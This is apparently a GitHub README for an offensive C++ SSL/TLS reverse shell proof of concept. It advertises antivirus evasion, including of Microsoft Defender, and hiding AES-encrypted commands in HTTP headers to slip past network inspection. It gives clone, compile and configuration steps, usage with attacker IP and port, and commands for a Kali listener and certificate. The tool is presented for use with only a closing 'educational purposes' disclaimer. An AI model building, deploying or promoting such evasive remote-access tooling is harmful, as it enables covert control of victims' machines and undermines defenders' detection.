# Encrypted SSL/TLS C++ Reverse Shell (HTTPS)
<b><span style="color:green">Status: Undetected (Tested on couple AV solutions including defenders)</span></b>

## Overview
When it comes to SSL/TLS reverse shells, the publicly available options are often limited to:
- **Using `msfvenom` to generate an HTTPS reverse shell (Signatured)**.
- **Using a PowerShell / Python payload (high level languages)**.

### Why Do We Need One?
Using a standard reverse shell often results in unencrypted traffic, which can be easily flagged by **Network Detection and Response (NDR)** systems or firewalls. These tools inspect network traffic and can identify remote code execution patterns, blocking the binary and alerting defenders.

An encrypted reverse shell helps evade such detection by:
1. Encrypting all communication, making it harder for network tools to inspect the traffic.
2. Using SSL to blend in with legitimate HTTPS traffic.

To address this gap, I created a simple **C++ SSL Reverse Shell** POC (commented and explained):
- **Undetected** by Microsoft Defender and some other AV solutions at the time of publishing.
- Enables secure communication via SSL, reducing the chance of detection.
- Using AES Encryption / Decryption and embedding the results and commands within HTTP headers to bypass deep packet inspection.

> **Note**: I tested the binary against a limited set of antivirus solutions, and results may vary across environments.

---

## Purpose of the POC

This Proof of Concept (POC) demonstrates how to build a reverse shell that utilizes **SSL/TLS encryption** and **AES encryption/decryption** to achieve secure communication between the attacker and the target. The main objectives and functionality of this POC are as follows:

- **Avoid Detection**: By using SSL/TLS (the same protocol used for legitimate HTTPS traffic), the reverse shell traffic blends in with regular encrypted web traffic, making it much harder to detect by Network Detection and Response (NDR) systems or firewalls.
- **Encrypted Communication**: The communication between the client (target) and the attacker is encrypted using **AES** (Advanced Encryption Standard). This ensures that even if the traffic is intercepted, it cannot be easily read or tampered with without the correct decryption key.
- **Command Execution in Encrypted Form**: Commands are **encrypted** on the server side and sent to the client over the SSL connection. The client decrypts these commands, executes them, and then sends back the encrypted output to the attacker.
- **Embedding Commands in HTTP Headers**: The encrypted command is embedded within a custom HTTP header (`X-Command`), allowing it to pass through web proxies, firewalls, or any other inspection system that may be scanning traffic for unusual activity. This technique makes the reverse shell more difficult to detect by conventional network traffic analysis tools.
- **Simulating Legitimate HTTPS Traffic**: By using HTTPS (SSL/TLS) and embedding encrypted payloads within HTTP headers, the reverse shell traffic appears as regular secure web traffic, which helps evade deep packet inspection (DPI) systems that are typically used to identify malicious traffic patterns.
- **Encrypted Results Sent Back**: The results of the executed commands are also encrypted using **AES** and sent back to the attacker through the SSL connection. This ensures that the response is equally protected and remains secure during transmission, preventing interception , tampering or detection by unauthorized parties.

The goal of this POC is to illustrate a method of bypassing common network security mechanisms by employing common, but underused, techniques to maintain the confidentiality and integrity of the communication channel. It is important to note that while the reverse shell is **undetected** by some AV solutions, it is **not guaranteed** to bypass all defenses.

---

## Setup Instructions
Follow these steps to set up the project:

1. **Download the Necessary Files**:
   - Clone the repository:  
     ```bash
     git clone https://github.com/V-i-x-x/SSLReverseShell.git
     ```
   - Download `OpenSSLWin64.zip` (linked in the repository).

2. **Extract OpenSSL Libraries**:
   - Unzip `OpenSSLWin64.zip` into a folder of your choice.  
     For example, in the project, I placed it in the `C:\` directory.

     ```plaintext
     C:\OpenSSLWin64
     ```

3. **Compile the Project**:
   - Ensure the project includes the OpenSSL libraries for successful compilation into a single `.exe` binary.

---

## Additional Notes
- **OpenSSLWin64**: This is the precompiled SSL library required for the project. Ensure it is correctly set up to avoid linking issues.
- **Testing**: While the binary is undetectable by some AV solutions as of now, this is not guaranteed against all antivirus software or future updates.

---

## Configuration In Visual Studio

1- Go to C/C++ → Code Generation → Runtime Library.  
Set this to Multi-threaded (/MT) to ensure that your application links statically against the runtime libraries, which helps in creating a single binary.

![Local Image](./images/MT.png "MT FLAG")

2- Configuration Properties > C/C++ > General, add the path to the OpenSSL include directory (C:\OpenSSLWin64\install\include) to Additional Include Directories.

![Local Image](./images/Include.png "Include Libraries")

3- Under Configuration Properties > Linker > General, add the path to the OpenSSL library directory (C:\OpenSSLWin64\install\lib) to Additional Library Directories

![Local Image](./images/Linker1.png "Linker.png")

4- Under Configuration Properties > Linker > Input, add the following to Additional Dependencies:  
C:\OpenSSLWin64\install\lib\libssl.lib  
C:\OpenSSLWin64\install\lib\libcrypto.lib

![Local Image](./images/Linker2.png "Linker.png")

---

## Usage

```
Usage: C:\Users\Vixx\Downloads\SSLReverseShell.exe <ATTACKER_IP> <ATTACKER_PORT>
Example: SSLReverseShell.exe 192.168.100.10 443
```

---

## Capture the reverse shell in your Kali OS

1- Generate a New RSA Private Key and Self-Signed Certificate (Containing the Public Key)
```
openssl req -newkey rsa:2048 -nodes -keyout attacker.key -x509 -days 365 -out attacker.crt
```
2- Python Script will be the server to capture the shell and send the command back to client (encrypted with aes)
- Install required library

```
pip3 install pycryptodome
```
- Start the Server
```
┌──(kali㉿kali)-[~/Desktop/pen-300/sslrevshell]
└─$ python3 sslserverv1.3.py      
[*] Listening on 0.0.0.0:443
```
---

### Disclaimer
This project is for **educational purposes only**. Unauthorized use of this tool in production or against systems without explicit permission is strictly prohibited.
